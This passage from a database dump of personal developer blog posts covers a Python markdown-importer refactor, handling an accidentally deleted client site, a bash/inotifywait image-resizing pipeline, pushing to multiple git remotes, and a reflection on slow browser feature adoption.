        self.meta = {**self.meta, **self._extract_meta(split_article[1])}

        if self.meta.get(''id''):
            self.article = models.Article.query.get(self.meta.get(''id''))
            self.article.id = self.meta.get(''id'')
            print("Article exists. Updating...")
        else:
            self.article = models.Article()
            print("New article.")

        self.article.title = self.head[''title'']
        self.article.url = self.head[''url'']
        self.article.blurb = self.head[''blurb'']
        self.article.text = self.markdown_processor.process(split_article[2])

        self.article.parent_id = self.meta.get(''parent'')
        self.article.type = self.meta.get(''type'', ''blog'')
        self.article.blurb = self.head.get(''blurb'')

        db.session.add(self.article)

        print("Removing tags")
        self.article.tags = []
        db.session.commit()

        for tag in self.meta[''tags'']:
            t = models.Tag.query.filter_by(tag=tag).first()

            if t is None:
                db.session.add(models.Tag(tag=tag))
                db.session.commit()
                t = models.Tag.query.filter_by(tag=tag).first()

            self.article.tags.append(t)
            print("Added tag: " + tag)

        db.session.commit()
        print("Article saved.")

    def _extract_head(self, raw):
        self.lines = raw.splitlines()

        # Strips of the ''# '' (hash-space) at the start of the title
        self.title = self.lines[0].strip()[2:]

        print(''Title: '' + self.title)
        if self.title is '''':
            print("Title is empty. Do you have blank lines at top of file?")
            sys.exit(6)

        self.url = self.title
        self.url = re.sub(" ", "-", self.url)
        self.url = re.sub("\.", "-", self.url)
        self.url = re.sub(":", "-", self.url)
        self.url = re.sub("-+", "-", self.url)
        self.url = self.url.replace(''-+'', ''-'')
        self.url = self.url.replace(''.+'', ''-'')
        self.url = self.url.replace('':+'', '''')
        self.url = self.url.lower()

        self.blurb = self.markdown_processor.process("\n".join(x for x in self.lines[1:] if x))

        return {''title'': self.title, ''url'': self.url, ''blurb'': self.blurb}

    def _extract_meta(self, raw_header):
        self.meta = {}

        self.lines = iter(raw_header.splitlines())

        for line in self.lines:
            s = line.split('':'')

            if len(s) > 1:
                self.meta[s[0].lower()] = s[1]

        if self.meta[''tags'']:
            self.meta[''tags''] = self.meta[''tags''].split('','')
        else:
            self.meta[''tags''] = []

        return self.meta
```

to this:

```python
class Article:
    def __init__(self, text, meta):

        if meta[''id'']:
            article = models.Article.query.get(meta[''id''])
            print("Article exists. Updating...")
        else:
            article = models.Article()
            print("New article.")

        article.title = meta[''title'']
        article.url = meta[''url'']
        article.blurb = meta[''blurb'']
        article.parent_id = meta[''parent'']
        article.type = meta[''type'']
        article.text = text

        db.session.add(article)

        print("Removing tags")
        article.tags = []
        db.session.commit()

        for tag in meta[''tags'']:
            t = models.Tag.query.filter_by(tag=tag).first()

            if t is None:
                db.session.add(models.Tag(tag=tag))
                db.session.commit()
                t = models.Tag.query.filter_by(tag=tag).first()

            article.tags.append(t)
            print("Added tag: " + tag)

        db.session.commit()
        print("Article saved.")
```

There is a supporting file class that handles opening and extracting the content from the file. Previously it was just a file to get the raw string and pass of processing however this change now has that class do the extraction and mapping of meta (sanity chck for what is present and what is not) and then return the md object.

```python
class File:
    """
    File actions
    """

    def __init__(self, filename):
        self.text = None
        self.md = None

        try:
            with open(r''articles/'' + filename) as file_contents:
                self.md = markdown.Markdown(
                    extensions=[GifV(), ''meta'', ''fenced_code'', ''codehilite'', ''toc'']
                )
                self.text = self.md.convert(file_contents.read())
        except FileNotFoundError:
            print("I was not able to find the file to open")
            exit(7)

        id_regex = re.search(r''^\d\d\d-'', filename)

        if id_regex:
            self.md.Meta[''id''] = id_regex.group(0).split(''-'')[0]
        else:
            self.md.Meta[''id''] = None

        try:
            self.md.Meta[''title''] = self.md.Meta[''title''][0]
        except KeyError:
            print("Articles need a title")
            exit(8)

        try:
            self.md.Meta[''url''] = self.make_url_from_title(self.md.Meta[''title''])
        except KeyError:
            pass

        try:
            self.md.Meta[''blurb''] = markdown.markdown(self.md.Meta[''blurb''][0])
        except KeyError:
            print("Articles need a blurb")
            exit(8)

        try:
            self.md.Meta[''parent''] = self.md.Meta[''parent''][0]
        except KeyError:
            self.md.Meta[''parent''] = None

        try:
            self.md.Meta[''type''] = self.md.Meta[''type''][0]
        except KeyError:
            self.md.Meta[''type''] = ''blog''

        try:
            self.md.Meta[''tags''] = self.md.Meta[''tags''].split('','')
        except KeyError:
            self.md.Meta[''tags''] = []

    @staticmethod
    def make_url_from_title(title):
        url = title
        url = re.sub(r" ", "-", url)
        url = re.sub(r"\.", "-", url)
        url = re.sub(r":", "-", url)
        url = re.sub(r"-+", "-", url)
        url = re.sub(r"-+$", "", url)
        url = url.lower()
        return url
```

In this section of that code:

``` python
with open(r''articles/'' + filename) as file_contents:
    self.md = markdown.Markdown(
        extensions=[GifV(), ''meta'', ''fenced_code'', ''codehilite'', ''toc'']
    )
    self.text = self.md.convert(file_contents.read())
```

I need to open a file, read the content and now because there is no longer any custom parsing, convert straight away. md provides a method ```convertFile()``` that could take care of this step, but it can only outout to standard out or to another file. I''ll see about time to submit a patch for that.',NULL),
	('016a5e22-8400-76ad-ac6b-000dcf8620e2'::uuid,'So you deleted your client''`s production website','so-you-deleted-your-clients-production-website','What to do if you accidentally delete your clients production website','blog'::com.variant,'Step that might be helpful if you accidentally delete your clients production site.

## Step 1: Don''t panic
While scary and gut-wrenching, panicking will only make the situation worse. The first thing is to take stock of what has happened. Has the site really truly been deleted or has something less nasty happened? Is there an immediate solution?

## Step 2: Talk to your client
Pick up the phone and call your client. Get ahead of them on this. Do not wait for them to try to use the site only to see nothing appear. Call them.

Explain that you fucked up. Explain that they are now your number one client until this has been fixed (they were already #1 right? Right?).

## Step 3: Get to work
Give them a plan to get the site back. "We are going to restore from backup. It will take ~1 hour."

Keep them informed. Stay on the phone if it is going to be done in the next ten minutes otherwise ring them with an update every ten (or whatever they want). Do not leave them thinking you have run off. Even if you do not have new information, let them know that you have nothing new. They need to know you are still working for them.

## Step 4: Apologise and improve
Once the dust has settled after the site is backup send them an apology bottle of their intoxicant of choice, and an explanation accepting fault with a layout of the changes to policy that means this can''t happen again.

Failing all that: hope your indemnity insurance is paid up

## Story time
Thankfully I have never deleted a production site. This article was inspired by an event where someone else at the place I worked at the time did so on a Friday morning while cleaning up old accounts on a shared hosting server. The usual process in this situation failed as the backups did not work (site was ~5 years old, and the backups were incremental diffs which fell on their face when submitted for restoration). The site was down for ~30 hours before a copy of the Wayback Machine could be downloaded and put in place. The backups were eventually fixed, and the site was restored after ~48 hours. The new policy is to suspend accounts for a year before deletion and also to have a copy of the account on a local (in the office) removable drive. Saved us a couple of times (and been profitable once when a client from a few years previous came back).',NULL),
	('016a6396-6f6b-7471-a897-abd7a9f3c161'::uuid,'Let''s make a terrible image processing pipeline','lets-make-a-terrible-image-processing-pipeline','With the advent of the `<picture>` tag and the general support of media-queries, it is time to automate image production.','blog'::com.variant,'While people had previously broached the topic of media-queries it took until the early 2000''s to get an agreed up spec drafted and then more than another decade to have it formalised after enough browser buy in happened.

With the arrival of mobile and HTML5 the door opened again as people began to look at ways to combat Wirth''s Law slowing down user experience''s and download times.

Two things that emerged out of this: the `<picture>` tag with media queries for different resolutions and newer, more efficient image formats. Combined, users only need to download the images at the resolution they will actually use and in the most efficient format they will use. Win, win.

It is not all peaches and cream however as this:

```html
<img src="https://example.com/logo.png" alt="Example site''s logo, rainbow coloured and flying high" title="See example site''s page">
```
becomes:

```html
<picture>
    <source srcset="https://example.com/logo_274-37.webp 274w,
    https://https://example.com/logo_160-22.webp 160w"
    sizes="(max-width: 767px) 160px,
            274px"
    type=image/webp>

    <source srcset="https://example.com/logo_274-37.png 274w,
    https://https://example.com/logo_160-22.png 160w"
    sizes="(max-width: 767px) 160px,
            274px"
    type=image/png>
    <img src="https://example.com/logo.png" alt="Example site''s logo, rainbow coloured and flying high" title="See example site''s page">
</picture>
```

So a bit more work needs to go into producing a page, the logistics of which are for a different article [i.e](/blog/lets-make-a-terrible-markdown-extension-pt1-background). I am going to go through how I automated the creation of the images that feed into the `srcset`s.

## First things first

To make this as lazy and as efficient as possible, the solution should probably revolve around a pipeline that watches a folder, does the work and then spits it out in a known folder. No clicking, no selecting and image then pressing upload and then download a zip of the contents. No waiting till I am back online after stomping around offline for a few days.

Local problems, local solutions.

[This screams of `inotifywait`](https://linux.die.net/man/1/inotifywait).

## Second things second
There are a few things that will need to happen in this pipeline: take in an image, convert it to the defined formats, resize it to fit the media queries, rename the files appropriately and then put them somewhere.

This whole process could be one giant bash script but that sounds a nightmare to write, debug and support. So taking a page out of the Unix philosophy: one function, one folder.

The general approach is: have a folder for the function (`format`, `resize`, `rename` etc) which can watch for input (a file written or copied in), do the next step and then push the file out to the next function. KISS.

## `inotifywait`
You can ask Linux to watch and react to a pretty comprehensive set of actions that might happen on a folder or file: running `inotifywait -m file` will output them as they come in (the ''`-m`'' is for `monitor` which is used as the program will stop after the first event otherwise).

This will output all the events that happen to the file or folder that is monitored.

```bash
~> inotifywait -m Desktop/drop/
Setting up watches.
Watches established.
Desktop/drop/ CREATE foo.png
Desktop/drop/ OPEN foo.png
Desktop/drop/ MODIFY foo.png
Desktop/drop/ MODIFY foo.png
Desktop/drop/ MODIFY foo.png
Desktop/drop/ MODIFY foo.png
Desktop/drop/ MODIFY foo.png
Desktop/drop/ MODIFY foo.png
Desktop/drop/ CLOSE_WRITE,CLOSE foo.png
Desktop/drop/ OPEN,ISDIR
Desktop/drop/ ACCESS,ISDIR
Desktop/drop/ ACCESS,ISDIR
Desktop/drop/ CLOSE_NOWRITE,CLOSE,ISDIR
Desktop/drop/ OPEN,ISDIR
Desktop/drop/ ACCESS,ISDIR
Desktop/drop/ CLOSE_NOWRITE,CLOSE,ISDIR
Desktop/drop/ MOVED_FROM foo.png
```

You can see that I copied the file `foo.png` into the folder (moved has a different event `MOVED_TO`), the system opens the file, copied the content in and then closed it. The system then accessed it a bit later and finally I moved the file out.

The output can be formatted thusly: `inotifywait --format <format>`

```bash
inotifywait -m Desktop/drop/ --format %w%f
Setting up watches.
Watches established.
Desktop/drop/foo.png
```

You can listen to only the events you want too: `inotifywait -e <event[,event,...]>`

```bash
~>inotifywait -m Desktop/drop/ -e moved_to
Setting up watches.
Watches established.
Desktop/drop/ MOVED_TO foo.png
```

Very handy stuff. The `man` page has the details you need.

## Of note
While up the actual watches and processes is fairly straightforward at this point there are a few gotchas.

The `create` event does not mean the file is ready to use. For example, when the file conversion for the `webp` converter runs, it will make the new file directly where it is told (rather than a temp file in a temp folder and move it in when done). This will trigger a `create` event then start filling it with the content of the file before firing off a `close` event (`close_write` specifically). Moving a file only triggers the move event. Be aware of what you are doing and watching for.

Running multiple `inotifywait` from the one script gets tricky. Running it will block and wait for it to return before allowing the rest of the script to run. You will need to run it in the background (`&`).


## Get on with it already.
### Entry
To get files into the process, the easiest way would be to watch a known folder, take the files dumped and then put them into the next step. Not much to this one.

```bash
inotifywait -m <watched_folder> -q --format ''%w%f'' -e close_write,moved_to | \
    while read file; do
        cp ${file} finished # Original file
        mv ${file} formatter/drop
    done
```

As mentioned previously, we are watching for files both copied in and also moved in. Formatter is the next step in the process. The `cp` line takes the original file and copies it to the end of the process as an unmolested original, the dropped file then enters into the formatting process.

### Formatter

```bash
formats=$(find . -type d -not -path . -not -path ./drop -not -path ./finished)

inotifywait -m drop -q --format ''%w%f'' -e moved_to | \
    while read file; do
        while read -r dir; do
            cp ${file} ${dir}
        done <<< ${formats}
        cp ${file} ../resizer/drop # need to convert original format too
        rm ${file}
```

There are several folders here that need to be looked at:
```bash
converter_flif.sh  drop     finished     flif    webp
converter_webp.sh  drop.sh  finished.sh  run.sh
```
The drop and finished (and their `.sh` contemporaries) are just the entry and exit points to the step. The others are the ones that do the work. Each is a format that gets converted to. It is assumed that `jpg`s do not get converted to `png`s and vice-a-versa (so no folder for them). While `webp` will consume most anything you can throw at it, `flif` is not nearly so mature and will only do `png`''s (and other vector image types) at time of writing. `jpg`s will still end up in the folder, but the conversion will fail and there will be no output.

```bash
# Relying on silently swallowing errors as to weather or not the conversion was a success
# Currently only PNG are supported. JPGs will just be swallowed.

if [[ ! -d flif ]]; then
    mkdir flif
fi

inotifywait -m flif -q --format ''%f'' -e close_write | \
    while read file; do
        flif flif/${file} ../finished/${file%.*}.flif &> /dev/null
        rm flif/${file}
    done
```

Due to the ability for flif to only download the data needed to show well at the required size, this output goes directly to finished. The other(s) go to the `resize` step.

<aside>You will see this pattern of watching a drop folder and coping it to a finished folder which moves it to the next folder a lot. It seems to work quite well.</aside>

### Resizer

```bash
#!/usr/bin/env bash

source ../functions.sh

size_folders=$(find . -type d -not -path . -not -path ./drop -not -path ./finished)

inotifywait -m -q -r ${size_folders} --format ''%w%f'' -e close_write | \
    while read found_file; do
        file_name=$(echo ${found_file} | rev | cut -d ''/'' -f 1 | rev | cut -d ''.'' -f 1)
        file_ext=$(echo ${found_file} | rev | cut -d ''/'' -f 1 | rev | cut -d ''.'' -f 2)
        file_type=$(get_type ${found_file})
        size_shape=$(echo ${found_file} | rev | cut -d ''/'' -f 2 | rev)
        shape=${size_shape: -1}
        size=${size_shape::-1}

        # ''convert'' needs XSIZExYSIZE and ''cwebp'' needs XSIZE YSIZE so doubling up variables to use this later
        if [[ ${shape} = ''x'' ]]; then
            direction=''''
            x=${size}
            y=0
        else
            direction=x
            y=${size}
            x=0
        fi

        if [[ ${file_type} = ''jpg'' ]]; then
            convert ${found_file} -resize ${direction}${size} finished/${file_name}_${size_shape}.${file_ext} &> /dev/null
        fi

        if [[ ${file_type} = ''png'' ]]; then
            convert ${found_file} -resize ${direction}${size} finished/${file_name}_${size_shape}.${file_ext} &> /dev/null
        fi

        if [[ ${file_type} = ''webp'' ]]; then
            cwebp ${found_file} -mt -resize ${x} ${y} -o finished/${file_name}_${size_shape}.${file_ext} &> /dev/null
        fi

        rm ${found_file}
    done
```

The `functions.sh` file has a function in it `file_type` that return the self reported `file` type.

The interesting part here is that the file sizes converted to are dynamically calculated by the names of the folders supplied in both the x and y size. No cropping occurs, and it will also attempt to resize bigger as it assumes you know what you are doing.

### Finished
The final output end up like this:
```
house_300x218.png
house_551x400.png
house_700x508.png
house.flif
house_300x218.webp
house_551x400.webp
house_700x508.webp
house.png
```

In the resizer there were three folders: 300x, 400y and 700x. Include the `flif` and the original you have all the images you need to make the `<picture>` and `srcset` work.

### Putting it all together
Running these can be done like this (from a central/main script):
```bash
./drop.sh ${1} &
./finished.sh ${2} &

formatter/run.sh &
resizer/run.sh &
renamer/run.sh &
```

`${1}` and `${2}` are the command line arguments for drop folder to watch and output folder respectively. Each child script has to be run as a background process for the aforementioned reason of `inotifywait` blocking the process.

Done.

<aside>
The `picture` tag has one caveat that might be non obvious: while it will skip over file formats that it doesn''t recognise, if the tag suggests a format that it does recognise but the file doesn''t exist, then a 404 is returned for the whole image and the next format in the tag is not looked at, even if the file were to exist. Be aware.
</aside>',NULL),
    ('016ca69d-4f88-7357-9319-77b47505e357'::uuid,'Pushing to multiple git repositories','pushing-to-multiple-git-repositories','Avoiding single point of failure when pushing git to a single repo (GitHub) by sending to multiple remotes at once.','blog'::com.variant,'git is a distributed version control. Distributed. While you can have a single `master` remote it can be very handy to push changes to several remotes while onyl pulling from one. Here is how I do it.

Open up the `.git/config` file in your repository

Inside this there are several sections that are of interest. The following is a bog standard file for a newly `initialise`''d repository.

```config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
```

Great stuff.

Now let''s add a remote to push changes to:

`git remote add github git@github.com:dougmiller/theMetaCityArticles.git`

which now gives us

```config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "github"]
	url = git@github.com:dougmiller/theMetaCityArticles.git
	fetch = +refs/heads/*:refs/remotes/github/*
```

We can of course add as many of these as we like

`git add remote tmc doug@themetacity.com:theMetaCityArticles.git`

which unsurprisingly adds a second remote

```config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "github"]
	url = git@github.com:dougmiller/theMetaCityArticles.git
	fetch = +refs/heads/*:refs/remotes/github/*
[remote "tmc"]
	url = doug@themetacity.com:theMetaCityArticles.git
	fetch = +refs/heads/*:refs/remotes/tmc/*
```

See what git thinks about where it can push and pull to: `git remote -v`

```
github	git@github.com:dougmiller/theMetaCityArticles.git (fetch)
github	git@github.com:dougmiller/theMetaCityArticles.git (push)
tmc	doug@themetacity.com:theMetaCityArticles.git (fetch)
tmc	doug@themetacity.com:theMetaCityArticles.git (push)
```

## You have `commit`''d
After doing a commit, to get the changes to each remote you could do:

`git push github master && git push tmc master`

This will get the data to both remotes but is a bit clunky. A cleaner solution can be to edit a remote in the config to have two push locations.

```config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "tmc"]
	url = doug@themetacity.com:theMetaCityArticles.git
	fetch = +refs/heads/*:refs/remotes/tmc/*
	pushurl = doug@themetacity.com:theMetaCityArticles.git
	pushurl = git@github.com:dougmiller/theMetaCityArticles.git
```

`git remote -v` again to see out changes.

```
origin	doug@themetacity.com:theMetaCityArticles.git (fetch)
origin	doug@themetacity.com:theMetaCityArticles.git (push)
origin	git@github.com:dougmiller/theMetaCityArticles.git (push)
```

The `(fetch)` line is taken from the `url` setting while the two `(push)` lines are from the `pushurl` line. The astute amongst you will notice that the `(fetch)` line does not have to match any of the push urls (in effect: A does some work -> B pull in changes then pushes -> C & D). In the case of working on theMetaCity articles, the GitHub repo is a public read only version used to gather feedback if people are interested.

Once you do a `push`, it works through the `pushurl`s in order, trying to send the changes and moving onto the next in the list on success or failure.',NULL),
    ('016da64f-fd3c-7a2b-b95d-ba598a3000a7'::uuid,'A brief note to young players','a-brief-note-to-young-players','A followup to a note I left to someone new to this game.','blog'::com.variant,'A while ago I left this note to someone new to the world of development who was frustrated with the speed at which new features are added to web browsers.

<blockquote cite="https://www.reddit.com/r/programming/comments/93502u/blink_intent_to_deprecate_and_remove_shadow_dom/e3b4g1v/">
<p>Yeah this part is really starting to piss me off to be honest, Firefox STILL doesn''t support components, Firefox STILL doesn''t support HTML 5.1 dialogs (native modal support so that we don''t have to keep doing modals in JS), I''ve literally been waiting for years for other browsers to catch up with Chrome so we can finally start using these technologies. I really do like Firefox but lately it seems supporting the latest standards no longer seems their priority and that makes me sad.
</p>
</blockquote>
<cite>– robvl</cite>

And my response:

<blockquote cite="https://www.reddit.com/r/programming/comments/93502u/blink_intent_to_deprecate_and_remove_shadow_dom/e3boab6/">
<p>"seems their priority"

You talk as if Firefox devs are these nebulous far off being that are somehow separate from us. I get that you like firefox and want it to be great and are coming from a place of frustration, but please (for everyone reading this) remember that Mozilla it made up of real people with real budgets and timelines and issues and competing attentions and priorities. It is hard to make this whole thing work. There are only so many hours in the day.

Since you really like ff, could you spare 10 minutes to report a bug or write some tests to help out? Review the spec or comment on the current implementation. There must be something that you can do that will help get everyone closer to these features.

Again, I know it is borne out of frustration but there is so much you can do to help everyone get past it.
</p>
</blockquote>

<cite>– me</cite>

While my original point still stands (be patient, dev is hard and expensive, help if you can) I feel there is a point not said.

To which: the perceived issues you are dealing with are Sysiphusian in nature. Having the solution in place for this issue won''t magically solve all your problems it only kicks the can down the road. You will just run into the next problem and the next one after that and the one after that one too until the day you stop working.

I would argue that it is a sign of a maturing dev when they can accept this reality and work with it to produce software and solve problems rather than bemoan the situation and not move forward.

My personal bug bear was inline/first-class citizenship of SVG that came with Firefox 4.0. What a glorious day that was when it shipped! We could have SVG everywhere and in everything, birds would sing and babies would be born. So I went about and put SVGs directly in to pages.

Nothing changed.

Previous to that I needed to either put them in via `<object>` tags or equivalent to have them show up. It was an annoying extra layer and hoop to jump though that took extra effort and tooling to solve. But solve it you do and move on to the next problem. And you do move on. That''s the secret here, you deal with what you have in-font of you, make compromises, push back where you can and ultimately accept your fate. Getting angry and frustrated, while cathartic, doesn''t help with the situation.

And it is Sysiphusian task as because as soon as you overcome one challenge the next rears its ugly head. If you can manage to push long enough and hard enough, you can ship some pretty OK software maybe.

Back to the original poster: what would having the native controls then lead to? One less dependency in the page? While that is a nice ideal to have, the problem is solved enough that it is time to move on to the next issue.

Which leads back to my next issue. Having <code>Wallclock</code> implemented for SVG would make a project I am working on so much easier and cleaner to implement but alas we are not getting it in 1.2, but maybe we are in 2 (maybe I should do it if I were to listen to my own advice).

So back to the mountain...


',NULL);

